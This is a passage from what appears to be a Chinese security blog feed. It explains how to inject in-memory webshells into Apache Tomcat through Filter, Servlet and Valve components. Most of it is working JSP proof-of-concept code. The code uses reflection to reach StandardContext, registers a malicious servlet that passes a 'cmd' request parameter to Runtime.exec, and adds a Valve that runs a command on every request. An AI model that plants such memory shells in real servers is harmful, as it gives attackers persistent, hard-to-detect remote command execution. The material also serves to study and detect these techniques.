class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            Filter<span class="token punctuation">.</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>    Field requestField <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"request"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    requestField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Request requestImp <span class="token operator">=</span> <span class="token punctuation">(</span>Request<span class="token punctuation">)</span> requestField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>    StandardContext standardContext <span class="token operator">=</span> <span class="token punctuation">(</span>StandardContext<span class="token punctuation">)</span>requestImp<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ServletFilter servletFilter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServletFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//FilterDef</span>    FilterDef filterDef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterDef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    filterDef<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span><span class="token string">"ServletFilter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    filterDef<span class="token punctuation">.</span><span class="token function">setFilterClass</span><span class="token punctuation">(</span>servletFilter<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    filterDef<span class="token punctuation">.</span><span class="token function">setFilter</span><span class="token punctuation">(</span>servletFilter<span class="token punctuation">)</span><span class="token punctuation">;</span>    standardContext<span class="token punctuation">.</span><span class="token function">addFilterDef</span><span class="token punctuation">(</span>filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//FilterMap</span>    FilterMap filterMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    filterMap<span class="token punctuation">.</span><span class="token function">setFilterName</span><span class="token punctuation">(</span><span class="token string">"ServletFilter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    filterMap<span class="token punctuation">.</span><span class="token function">addURLPattern</span><span class="token punctuation">(</span><span class="token string">"/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    filterMap<span class="token punctuation">.</span><span class="token function">setDispatcher</span><span class="token punctuation">(</span>DispatcherType<span class="token punctuation">.</span>REQUEST<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//调度器类型设置为处理客户端请求</span>    standardContext<span class="token punctuation">.</span><span class="token function">addFilterMapBefore</span><span class="token punctuation">(</span>filterMap<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//FilterConfig</span>    Constructor<span class="token operator">&lt;</span>ApplicationFilterConfig<span class="token operator">></span> applicationFilterConfigConstructor <span class="token operator">=</span> ApplicationFilterConfig<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>Context<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> FilterDef<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    applicationFilterConfigConstructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ApplicationFilterConfig applicationFilterConfig <span class="token operator">=</span> applicationFilterConfigConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">,</span> filterDef<span class="token punctuation">)</span><span class="token punctuation">;</span>    Field filterConfigsField <span class="token operator">=</span> standardContext<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"filterConfigs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    filterConfigsField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Map filterConfigs <span class="token operator">=</span> <span class="token punctuation">(</span>Map<span class="token punctuation">)</span> filterConfigsField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>standardContext<span class="token punctuation">)</span><span class="token punctuation">;</span>    filterConfigs<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"ServletFilter"</span><span class="token punctuation">,</span> applicationFilterConfig<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">></span></code></pre><h2 id="Servlet型内存马"><a href="#Servlet型内存马" class="headerlink" title="Servlet型内存马"></a>Servlet型内存马</h2><p>Servlet是最晚被调用的，调用顺序为Listener-&gt;Filter-&gt;Servlet</p><p>servlet分为四个阶段</p><pre class=" language-java"><code class="language-java"><span class="token number">1</span><span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span>，初始阶段，只被调用一次，也是第一次创建Servlet时被调用<span class="token number">2</span><span class="token punctuation">.</span><span class="token function">service</span><span class="token punctuation">(</span><span class="token punctuation">)</span>，服务阶段。处理客户请求，<span class="token function">doGet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">doPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span>等<span class="token number">3</span><span class="token punctuation">.</span><span class="token function">doGet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">doPost</span><span class="token punctuation">(</span><span class="token punctuation">)</span>处理阶段<span class="token number">4</span><span class="token punctuation">.</span><span class="token function">destory</span><span class="token punctuation">(</span><span class="token punctuation">)</span>，销毁阶段</code></pre><p>构造一个恶意类</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>WebServlet<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span><span class="token string">"/ServletShell"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ServletServlet</span> <span class="token keyword">implements</span> <span class="token class-name">Servlet</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span>ServletConfig config<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> ServletConfig <span class="token function">getServletConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">service</span><span class="token punctuation">(</span>ServletRequest req<span class="token punctuation">,</span> ServletResponse res<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>        String cmd <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> String <span class="token function">getServletInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240303164012-0xhdsy1.png" alt="image">​</p><p>这次查看堆栈信息是看不到创建Servlet的过程的，只能从头开始分析了,下图参考<a href="https://blog.csdn.net/u010883443/article/details/107463782%E7%9A%84%E4%B8%80%E5%BC%A0%E5%9B%BE%E7%89%87">https://blog.csdn.net/u010883443/article/details/107463782的一张图片</a></p><p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240304091722-0ui67ht.png" alt="image">​</p><p>我们重点关注web.xmlwebConfig解析的下一步，xml赋值对象configureContext，定位<code>org.apache.catalina.startup</code>​的<code>ContextConfig</code>​类的<code>configureContext(WebXml webxml)</code>​方法：</p><pre class=" language-java"><code class="language-java">    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">configureContext</span><span class="token punctuation">(</span>WebXml webxml<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// As far as possible, process in alphabetical order so it is easy to</span>        <span class="token comment" spellcheck="true">// check everything is present</span>        <span class="token comment" spellcheck="true">// Some validation depends on correct public ID</span>        <span class="token comment" spellcheck="true">//</span>        <span class="token comment" spellcheck="true">/*        .......        加载xml文件            Wrapper wrapper = context.createWrapper();        */</span>        <span class="token comment" spellcheck="true">//</span>            wrapper<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span>servlet<span class="token punctuation">.</span><span class="token function">getServletName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span>String<span class="token operator">></span> params <span class="token operator">=</span> servlet<span class="token punctuation">.</span><span class="token function">getParameterMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>Entry<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> entry <span class="token operator">:</span> params<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                wrapper<span class="token punctuation">.</span><span class="token function">addInitParameter</span><span class="token punctuation">(</span>entry<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> entry<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            wrapper<span class="token punctuation">.</span><span class="token function">setRunAs</span><span class="token punctuation">(</span>servlet<span class="token punctuation">.</span><span class="token function">getRunAs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Set<span class="token operator">&lt;</span>SecurityRoleRef<span class="token operator">></span> roleRefs <span class="token operator">=</span> servlet<span class="token punctuation">.</span><span class="token function">getSecurityRoleRefs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>SecurityRoleRef roleRef <span class="token operator">:</span> roleRefs<span class="token punctuation">)</span> <span class="token punctuation">{</span>                wrapper<span class="token punctuation">.</span><span class="token function">addSecurityReference</span><span class="token punctuation">(</span>                        roleRef<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> roleRef<span class="token punctuation">.</span><span class="token function">getLink</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            wrapper<span class="token punctuation">.</span><span class="token function">setServletClass</span><span class="token punctuation">(</span>servlet<span class="token punctuation">.</span><span class="token function">getServletClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*        简化代码        */</span>            context<span class="token punctuation">.</span><span class="token function">addChild</span><span class="token punctuation">(</span>wrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Entry<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> entry <span class="token operator">:</span>                webxml<span class="token punctuation">.</span><span class="token function">getServletMappings</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            context<span class="token punctuation">.</span><span class="token function">addServletMappingDecoded</span><span class="token punctuation">(</span>entry<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> entry<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        SessionConfig sessionConfig <span class="token operator">=</span> webxml<span class="token punctuation">.</span><span class="token function">getSessionConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>sessionConfig <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>sessionConfig<span class="token punctuation">.</span><span class="token function">getSessionTimeout</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                context<span class="token punctuation">.</span><span class="token function">setSessionTimeout</span><span class="token punctuation">(</span>                        sessionConfig<span class="token punctuation">.</span><span class="token function">getSessionTimeout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">intValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            SessionCookieConfig scc <span class="token operator">=</span>                context<span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSessionCookieConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            scc<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span>sessionConfig<span class="token punctuation">.</span><span class="token function">getCookieName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            scc<span class="token punctuation">.</span><span class="token function">setDomain</span><span class="token punctuation">(</span>sessionConfig<span class="token punctuation">.</span><span class="token function">getCookieDomain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            scc<span class="token punctuation">.</span><span class="token function">setPath</span><span class="token punctuation">(</span>sessionConfig<span class="token punctuation">.</span><span class="token function">getCookiePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            scc<span class="token punctuation">.</span><span class="token function">setComment</span><span class="token punctuation">(</span>sessionConfig<span class="token punctuation">.</span><span class="token function">getCookieComment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>sessionConfig<span class="token punctuation">.</span><span class="token function">getCookieHttpOnly</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                scc<span class="token punctuation">.</span><span class="token function">setHttpOnly</span><span class="token punctuation">(</span>sessionConfig<span class="token punctuation">.</span><span class="token function">getCookieHttpOnly</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">booleanValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>sessionConfig<span class="token punctuation">.</span><span class="token function">getCookieSecure</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                scc<span class="token punctuation">.</span><span class="token function">setSecure</span><span class="token punctuation">(</span>sessionConfig<span class="token punctuation">.</span><span class="token function">getCookieSecure</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">booleanValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>sessionConfig<span class="token punctuation">.</span><span class="token function">getCookieMaxAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                scc<span class="token punctuation">.</span><span class="token function">setMaxAge</span><span class="token punctuation">(</span>sessionConfig<span class="token punctuation">.</span><span class="token function">getCookieMaxAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">intValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>sessionConfig<span class="token punctuation">.</span><span class="token function">getSessionTrackingModes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                context<span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setSessionTrackingModes</span><span class="token punctuation">(</span>                        sessionConfig<span class="token punctuation">.</span><span class="token function">getSessionTrackingModes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// Context doesn't use version directly</span>        <span class="token comment" spellcheck="true">// ....</span>    <span class="token punctuation">}</span></code></pre><p>这里面可以提取出几个关键代码：</p><pre class=" language-java"><code class="language-java">Wrapper wrapper <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">createWrapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>wrapper<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span>servlet<span class="token punctuation">.</span><span class="token function">getServletName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>wrapper<span class="token punctuation">.</span><span class="token function">setServletClass</span><span class="token punctuation">(</span>servlet<span class="token punctuation">.</span><span class="token function">getServletClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>context<span class="token punctuation">.</span><span class="token function">addChild</span><span class="token punctuation">(</span>wrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>context<span class="token punctuation">.</span><span class="token function">addServletMappingDecoded</span><span class="token punctuation">(</span>entry<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> entry<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这个就是注册Servlet的关键流程</p><p>写JSP文件注册即可</p><h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><pre class=" language-jsp"><code class="language-jsp"><%@ page import="javax.servlet.annotation.WebServlet" %><%@ page import="java.io.IOException" %><%@ page import="org.apache.catalina.Wrapper" %><%@ page import="java.lang.reflect.Field" %><%@ page import="org.apache.catalina.connector.Request" %><%@ page import="org.apache.catalina.Context" %><%@ page import="org.apache.catalina.core.StandardContext" %><%@ page contentType="text/html;charset=UTF-8" language="java" %><%!    @WebServlet(name = "ServletServlet", value = "/ServletServlet")    public class ServletServlet extends HttpServlet {        @Override        public void init(ServletConfig config) throws ServletException {        }        @Override        public ServletConfig getServletConfig() {            return null;        }        @Override        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {            String cmd = req.getParameter("cmd");            Runtime.getRuntime().exec(cmd);        }        @Override        public String getServletInfo() {            return null;        }        @Override        public void destroy() {        }    }%><%    Field requestField = request.getClass().getDeclaredField("request");    requestField.setAccessible(true);    Request requestImp = (Request) requestField.get(request);    StandardContext context = (StandardContext) requestImp.getContext();    Wrapper wrapper = context.createWrapper();    wrapper.setName("ServletServlet");    wrapper.setServletClass(ServletServlet.class.getName());    wrapper.setServlet(new ServletServlet());    context.addChild(wrapper);    context.addServletMappingDecoded("/ServletServlet", "ServletServlet");%></code></pre><p><strong>首先要访问这个jsp文件触发构造内存马</strong>，之后访问&#x2F;ServletServlet即可触发：</p><p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240304094737-5jsr7mg.png" alt="image">​</p><p>缺点就说必须访问对应的路径，不利于隐藏</p><h2 id="valve型内存马"><a href="#valve型内存马" class="headerlink" title="valve型内存马"></a>valve型内存马</h2><p>Tomcat有四大组件，分别是<code>Engine</code>​,<code>Host</code>​,<code>Context</code>​,<code>Wrapper</code>​。这四个之间的消息传递与沟通离不开<code>Valve（阀门）</code>​与<code>Pipeline（管道）</code>​</p><p>Valve的接口如下：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Valve</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> Valve <span class="token function">getNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setNext</span><span class="token punctuation">(</span>Valve valve<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">backgroundProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">invoke</span><span class="token punctuation">(</span>Request request<span class="token punctuation">,</span> Response response<span class="token punctuation">)</span>        <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ServletException<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isAsyncSupported</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>简单点理解就是在Tomcat的调用过程中肯定会调用到Valve.invoke,只要我们实现这个接口并且在Valve构造恶意代码就可以达到RCE的目的</p><p>但是需要讲构造的恶意Valve实现类加入到调用链中，这就需要用到<code>Pipeline</code>​，其接口如下：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Valve</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> Valve <span class="token function">getNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setNext</span><span class="token punctuation">(</span>Valve valve<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">backgroundProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">invoke</span><span class="token punctuation">(</span>Request request<span class="token punctuation">,</span> Response response<span class="token punctuation">)</span>        <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ServletException<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isAsyncSupported</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>使用<code>Pipeline</code>​时需要注意两个点</p><pre class=" language-xml"><code class="language-xml">1.pipeline添加恶意类实现RCE2.调用getNext()使得整条链子不会断，否则虽然可以执行命令但系统会出错</code></pre><h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h3><pre class=" language-jsp"><code class="language-jsp"><%@ page import="org.apache.catalina.Valve" %><%@ page import="org.apache.catalina.connector.Request" %><%@ page import="org.apache.catalina.connector.Response" %><%@ page import="java.io.IOException" %><%@ page import="java.lang.reflect.Field" %><%@ page import="org.apache.catalina.core.StandardContext" %><%@ page import="org.apache.catalina.Pipeline" %><%!    public class ServletValve implements Valve {        private Valve next;        @Override        public Valve getNext() {            return next;        }        @Override        public void setNext(Valve valve) {            this.next = valve;        }        @Override        public void backgroundProcess() {        }        @Override        public void invoke(Request request, Response response) throws IOException, ServletException {            try {                Runtime.getRuntime().exec("calc");                this.getNext().invoke(request, response);            } catch (IOException e) {                throw new RuntimeException(e);            }        }        @Override        public boolean isAsyncSupported() {            return false;        }    }%><%    Field requestField = request.getClass().getDeclaredField("request");    requestField.setAccessible(true);    Request requestImp = (Request)requestField.get(request);    StandardContext standardContext = (StandardContext)requestImp.getContext();    Pipeline pipeline = standardContext.getPipeline();    pipeline.addValve(new ServletValve());%></code></pre><p>访问一次后构造内存马，第二次生效</p><p><img src="/Blogimages/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240304105955-z9h86s9.png" alt="image">​</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://goodapple.top/archives/1355">https://goodapple.top/archives/1355</a></p><p><a href="https://xz.aliyun.com/t/11988">https://xz.aliyun.com/t/11988</a></p><p><a href="https://blog.csdn.net/u010883443/article/details/107463782">https://blog.csdn.net/u010883443/article/details/107463782</a></p><p><a href="https://www.cnblogs.com/coldridgeValley/p/5816414.html">https://www.cnblogs.com/coldridgeValley/p/5816414.html</a></p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>红日靶场4</title>
      <link href="/2024/01/05/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/"/>
      <url>/2024/01/05/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/</url>
      
